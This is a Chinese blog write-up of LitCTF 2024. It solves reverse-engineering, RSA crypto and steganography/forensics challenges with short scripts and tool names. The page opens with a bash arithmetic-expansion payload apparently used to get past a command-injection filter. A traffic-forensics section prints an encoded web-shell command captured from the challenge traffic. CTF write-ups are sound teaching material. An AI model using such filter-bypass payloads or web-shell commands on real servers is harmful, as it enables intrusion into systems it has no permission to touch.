+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python!!!!"></a>ez_python!!!!</h2><p>解包pyinstall打包后的.exe脚本:<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor下载</a></p>
+<p>然后发现ezpy.pyc，直接使用<a target="_blank" rel="noopener" href="https://www.lddgo.net/string/pyc-compile-decompile">在线工具反编译</a></p>
+<p>反编译结果:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span><br><span class="line"># Version : Python 3.11</span><br><span class="line"></span><br><span class="line">import Litctfbase64</span><br><span class="line">flag = input(&#x27;flag:&#x27;)</span><br><span class="line">flag = Litctfbase64.b64decode(flag)</span><br><span class="line"># WARNING: Decompyle incomplete</span><br></pre></td></tr></table></figure>
+
+<p>注意到有部分反编译失败，但能看到导入了LitCTFbase64库</p>
+<p>对其进行反编译，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span><br><span class="line"># Version : Python 3.11</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">BASE64_ALPHABET = &#x27;8kuWYm=1JiUPs7DT4x+X5tcqZKfGvA0gFLB6y3QbV2rNOlRdMwnEohjzSe9/HIa-&#x27;</span><br><span class="line"></span><br><span class="line">def b64decode(input_string):</span><br><span class="line">    pass</span><br><span class="line"># WARNING: Decompyle incomplete</span><br><span class="line"></span><br><span class="line">def from_base64(base64_string):</span><br><span class="line">    pass</span><br><span class="line"># WARNING: Decompyle incomplete</span><br></pre></td></tr></table></figure>
+
+<p>发现关键代码处均反编译失败，但得到BASE64_ALPHABET，推测为base64编码表</p>
+<p>使用如下脚本看字节码指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import dis</span><br><span class="line">import marshal</span><br><span class="line">import sys</span><br><span class="line">if len(sys.argv) == 2:</span><br><span class="line">    filename = sys.argv[1]</span><br><span class="line">    with open(filename,&quot;rb&quot;) as fp:</span><br><span class="line">        byteCode = fp.read()[16:]</span><br><span class="line">   </span><br><span class="line">    co  = marshal.loads(byteCode)</span><br><span class="line">    dis.dis(co)</span><br></pre></td></tr></table></figure>
+
+<p>发现ezpy.pyc中有可疑输出X&#x3D;3o4hx&#x3D;0EZwf&#x3D;mMv13gX&#x3D;3o4hx&#x3D;qje2ZjtgZQmEKXZog4&#x3D;&#x3D; 猜测为密文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> 0           0 RESUME                   0</span><br><span class="line"></span><br><span class="line"> 1           2 LOAD_CONST               0 (0)</span><br><span class="line">             4 LOAD_CONST               1 (None)</span><br><span class="line">             6 IMPORT_NAME              0 (Litctfbase64)</span><br><span class="line">             8 STORE_NAME               0 (Litctfbase64)</span><br><span class="line"></span><br><span class="line"> 2          10 NOP</span><br><span class="line"></span><br><span class="line"> 9          12 NOP</span><br><span class="line"></span><br><span class="line">12          14 PUSH_NULL</span><br><span class="line">            16 LOAD_NAME                1 (input)</span><br><span class="line">            18 LOAD_CONST               2 (&#x27;flag:&#x27;)</span><br><span class="line">            20 PRECALL                  1</span><br><span class="line">            24 CALL                     1</span><br><span class="line">            34 STORE_NAME               2 (flag)</span><br><span class="line"></span><br><span class="line">13          36 PUSH_NULL</span><br><span class="line">            38 LOAD_NAME                0 (Litctfbase64)</span><br><span class="line">            40 LOAD_ATTR                3 (b64decode)</span><br><span class="line">            50 LOAD_NAME                2 (flag)</span><br><span class="line">            52 PRECALL                  1</span><br><span class="line">            56 CALL                     1</span><br><span class="line">            66 STORE_NAME               2 (flag)</span><br><span class="line"></span><br><span class="line">15          68 LOAD_NAME                2 (flag)</span><br><span class="line">            70 LOAD_CONST               3 (&#x27;X=3o4hx=0EZwf=mMv13gX=3o4hx=qje2ZjtgZQmEKXZog4==&#x27;)</span><br><span class="line">            72 COMPARE_OP               2 (==)</span><br><span class="line">            78 POP_JUMP_FORWARD_IF_FALSE    13 (to 106)</span><br><span class="line"></span><br><span class="line">16          80 PUSH_NULL</span><br><span class="line">            82 LOAD_NAME                4 (print)</span><br><span class="line">            84 LOAD_CONST               4 (&#x27;win&#x27;)</span><br><span class="line">            86 PRECALL                  1</span><br><span class="line">            90 CALL                     1</span><br><span class="line">           100 POP_TOP</span><br><span class="line">           102 LOAD_CONST               1 (None)</span><br><span class="line">           104 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">17     &gt;&gt;  106 PUSH_NULL</span><br><span class="line">           108 LOAD_NAME                4 (print)</span><br><span class="line">           110 LOAD_CONST               5 (&#x27;no&#x27;)</span><br><span class="line">           112 PRECALL                  1</span><br><span class="line">           116 CALL                     1</span><br><span class="line">           126 POP_TOP</span><br><span class="line">           128 LOAD_CONST               1 (None)</span><br><span class="line">           130 RETURN_VALUE</span><br></pre></td></tr></table></figure>
+
+<p>最后，base64换表解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">str1 = &quot;X=3o4hx=0EZwf=mMv13gX=3o4hx=qje2ZjtgZQmEKXZog4==&quot;</span><br><span class="line"></span><br><span class="line">string1 = &quot;8kuWYm=1JiUPs7DT4x+X5tcqZKfGvA0gFLB6y3QbV2rNOlRdMwnEohjzSe9/HIa-&quot;</span><br><span class="line">string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line">print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>
+
+<h2 id="编码喵"><a href="#编码喵" class="headerlink" title="编码喵"></a>编码喵</h2><p>拖入IDA，shift+f12发现两个可疑字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgL0q1rgEZaZmdm0zwq4lweYzgeTngfHnI1ImMm5ltaXywnLowuYnJmWmx0 //推测为密文</span><br><span class="line">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 //推测为base64表</span><br></pre></td></tr></table></figure>
+
+<p>拖入脚本中运行即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">str1 = &quot;tgL0q1rgEZaZmdm0zwq4lweYzgeTngfHnI1ImMm5ltaXywnLowuYnJmWmx0 &quot;</span><br><span class="line"></span><br><span class="line">string1 = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br><span class="line">string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line">print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>
+
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">c_list = [] // your list</span><br><span class="line">for i in c_list:</span><br><span class="line">    t = gmpy2.iroot(i,3)</span><br><span class="line">    print(chr(t),end=&quot;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="common-primes"><a href="#common-primes" class="headerlink" title="common_primes"></a>common_primes</h2><p>求n1与n2的公约数即是p</p>
+<p>然后就是正常解密。</p>
+<h2 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h2><p>轩禹CTF_RSA工具直接秒</p>
+<h2 id="little-fermet"><a href="#little-fermet" class="headerlink" title="little_fermet"></a>little_fermet</h2><p>差不多的原题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jayq1/article/details/131931855">祥云杯 2022的little little fermat</a></p>
+<p>贴上exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes,bytes_to_long</span><br><span class="line">import libnum</span><br><span class="line">n = 122719648746679660211272134136414102389555796575857405114496972248651220892565781331814993584484991300852578490929023084395318478514528533234617759712503439058334479192297581245539902950267201362675602085964421659147977335779128546965068649265419736053467523009673037723382969371523663674759921589944204926693</span><br><span class="line">c = 109215817118156917306151535199288935588358410885541150319309172366532983941498151858496142368333375769194040807735053625645757204569614999883828047720427480384683375435683833780686557341909400842874816853528007258975117265789241663068590445878241153205106444357554372566670436865722966668420239234530554168928</span><br><span class="line">temp=gmpy2.iroot(n,2)[0] </span><br><span class="line">p=gmpy2.next_prime(temp)</span><br><span class="line">q=n//p</span><br><span class="line">assert p*q == n</span><br><span class="line">x = q-1</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">e = 65537</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">m = int(m ^ x)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="涐贪恋和伱、甾―⑺de毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé毎兮毎秒</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg工具</span><br></pre></td></tr></table></figure>
+
+<h2 id="你说得对，但"><a href="#你说得对，但" class="headerlink" title="你说得对，但__"></a>你说得对，但__</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk分离</span><br><span class="line">拼接图片</span><br></pre></td></tr></table></figure>
+
+<h2 id="原铁，启动！"><a href="#原铁，启动！" class="headerlink" title="原铁，启动！"></a>原铁，启动！</h2><p>![【1.0版本考据】历时两个半月！铁道文字翻译！-崩坏：星穹铁道社区-米游社]( <a target="_blank" rel="noopener" href="https://upload-bbs.miyoushe.com/upload/2023/05/09/326579707/3e556c8b48d40b51436df29198daa905_3495040659988463142.jpg?x-oss-process=image/resize">https://upload-bbs.miyoushe.com/upload/2023/05/09/326579707/3e556c8b48d40b51436df29198daa905_3495040659988463142.jpg?x-oss-process&#x3D;image&#x2F;resize</a> ,s_600&#x2F;quality,q_80&#x2F;auto-orient,0&#x2F;interlace,1&#x2F;format,jpg)</p>
+<p>![【图研所】提瓦特现行文字对照表-原神社区-米游社]( <a target="_blank" rel="noopener" href="https://upload-bbs.mihoyo.com/upload/2022/10/27/289799533/fcd8e8310bde689198d4be3e6b749f15_9129134670435119053.png?x-oss-process=image/resize">https://upload-bbs.mihoyo.com/upload/2022/10/27/289799533/fcd8e8310bde689198d4be3e6b749f15_9129134670435119053.png?x-oss-process&#x3D;image&#x2F;resize</a> ,s_600&#x2F;quality,q_80&#x2F;auto-orient,0&#x2F;interlace,1&#x2F;format,png)</p>
+<h2 id="盯帧珍珠"><a href="#盯帧珍珠" class="headerlink" title="盯帧珍珠"></a>盯帧珍珠</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stegsolve逐帧查看</span><br></pre></td></tr></table></figure>
+
+<h2 id="Everywhere-We-Go"><a href="#Everywhere-We-Go" class="headerlink" title="Everywhere We Go"></a>Everywhere We Go</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Audacity查看频谱图</span><br></pre></td></tr></table></figure>
+
+<h2 id="舔到最后应有尽有"><a href="#舔到最后应有尽有" class="headerlink" title="舔到最后应有尽有"></a>舔到最后应有尽有</h2><p>base64隐写</p>
+<p>直接PuzzleSolver秒杀</p>
+<h2 id="关键，太关键了"><a href="#关键，太关键了" class="headerlink" title="关键，太关键了!"></a>关键，太关键了!</h2><p>PuzzleSolver字频统计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bingo</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/keyword.html">关键字解密</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LITCTF&#123;I_MISS_YOU_BOSS&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="女装照流量"><a href="#女装照流量" class="headerlink" title="女装照流量"></a>女装照流量</h2><p>跟踪http</p>
+<p>28页为zip</p>
+<p>26页base64为key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y2QgL2QgIkM6XFxQcm9ncmFtIEZpbGVzXFxwaHBzdHVkeV9wcm9cXFdXV1xcTGl0Q1RGLXBjYXBuZyImemlwIC1QICJQYVNzdzByZF9MaXRDdEZfTDB2ZWx5X3RhbkppIiBmMWFnLnppcCBmbGFnLnBocCZlY2hvIDFhOTI1JmNkJmVjaG8gNmZmZWIx&amp;xf65aaf1672c18=ST</span><br></pre></td></tr></table></figure>
+
+<h2 id="The-love"><a href="#The-love" class="headerlink" title="The love"></a>The love</h2><p>掩码和压缩包</p>
+<p>提取爆破即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ykc5MlpWOXBjMTl3WVdsdVpuVnM</span><br></pre></td></tr></table></figure>
+
+<p>base64解两次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">love_is_painful</span><br></pre></td></tr></table></figure>
+
+<p>然后使用<code>DeepSound</code>注意版本必须是2.2 对爱情.wav解密即可，密码是上面的love_is_painful</p>
+<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>好久没有打过这么爽的一次比赛了，其他一点不懂的方向还能靠现学现卖混点分（））</p>
+<p>最近打了几把不是新生赛的比赛老是被暴杀，算是感受到CTF的无聊和苦闷了</p>
+<p>也许过了打新生赛的快乐阶段才算真正入门CTF吧</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exx"><span class="toc-number">1.1.</span> <span class="toc-text">exx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E4%BA%AE%E4%B8%BB%E9%A2%98-%E5%88%92%E6%8E%89-%E8%83%8C%E6%99%AF%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">高亮主题(划掉)背景查看器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%9F%E8%83%BD%E5%A5%97%E5%A8%83"><span class="toc-number">1.3.</span> <span class="toc-text">浏览器也能套娃?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAS-Serializing-Authentication-System"><span class="toc-number">1.4.</span> <span class="toc-text">SAS - Serializing Authentication System</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E2%80%A6-%E6%B1%A0%E5%AD%90%EF%BC%9F"><span class="toc-number">1.5.</span> <span class="toc-text">一个….池子？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BE%E4%B8%87%E7%BE%8E%E9%87%91%E7%9A%84%E8%AF%B1%E6%83%91"><span class="toc-number">1.6.</span> <span class="toc-text">百万美金的诱惑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">2.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">2.1.</span> <span class="toc-text">ez_python!!!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%96%B5"><span class="toc-number">2.2.</span> <span class="toc-text">编码喵</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#small-e"><span class="toc-number">3.1.</span> <span class="toc-text">small_e</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#common-primes"><span class="toc-number">3.2.</span> <span class="toc-text">common_primes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRT"><span class="toc-number">3.3.</span> <span class="toc-text">CRT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#little-fermet"><span class="toc-number">3.4.</span> <span class="toc-text">little_fermet</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">4.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B6%90%E8%B4%AA%E6%81%8B%E5%92%8C%E4%BC%B1%E3%80%81%E7%94%BE%E2%80%95%E2%91%BAde%E6%AF%8E%E5%85%AE%E6%AF%8E%E7%A7%92"><span class="toc-number">4.1.</span> <span class="toc-text">涐贪恋和伱、甾―⑺dé毎兮毎秒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E8%AF%B4%E5%BE%97%E5%AF%B9%EF%BC%8C%E4%BD%86"><span class="toc-number">4.2.</span> <span class="toc-text">你说得对，但__</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E9%93%81%EF%BC%8C%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="toc-number">4.3.</span> <span class="toc-text">原铁，启动！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AF%E5%B8%A7%E7%8F%8D%E7%8F%A0"><span class="toc-number">4.4.</span> <span class="toc-text">盯帧珍珠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Everywhere-We-Go"><span class="toc-number">4.5.</span> <span class="toc-text">Everywhere We Go</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%88%94%E5%88%B0%E6%9C%80%E5%90%8E%E5%BA%94%E6%9C%89%E5%B0%BD%E6%9C%89"><span class="toc-number">4.6.</span> <span class="toc-text">舔到最后应有尽有</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%EF%BC%8C%E5%A4%AA%E5%85%B3%E9%94%AE%E4%BA%86"><span class="toc-number">4.7.</span> <span class="toc-text">关键，太关键了!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B3%E8%A3%85%E7%85%A7%E6%B5%81%E9%87%8F"><span class="toc-number">4.8.</span> <span class="toc-text">女装照流量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-love"><span class="toc-number">4.9.</span> <span class="toc-text">The love</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-number">5.</span> <span class="toc-text">写在后面</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&text=LitCTF 2024 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&is_video=false&description=LitCTF 2024 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LitCTF 2024 wp&body=Check out this article: https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&name=LitCTF 2024 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&t=LitCTF 2024 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
